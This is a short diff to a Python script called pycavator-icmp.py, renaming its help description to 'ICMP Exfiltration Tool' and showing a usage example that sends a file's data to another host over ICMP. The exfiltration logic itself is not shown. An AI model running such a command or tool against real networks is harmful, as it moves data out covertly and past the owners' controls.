@@ -216,7 +216,7 @@ def merge_output_files(prefix, start_suffix, end_suffix, extension, output_folde
 def main():
     # Parse command line arguments
     parser = argparse.ArgumentParser(
-        description='Send and receive data using ICMP packets.',
+        description='PyCavator - ICMP Exfiltration Tool',
         epilog='''Examples:
   # Sender mode: exfiltrate data from a file
   python pycavator-icmp.py -f input.txt -d 192.168.1.101
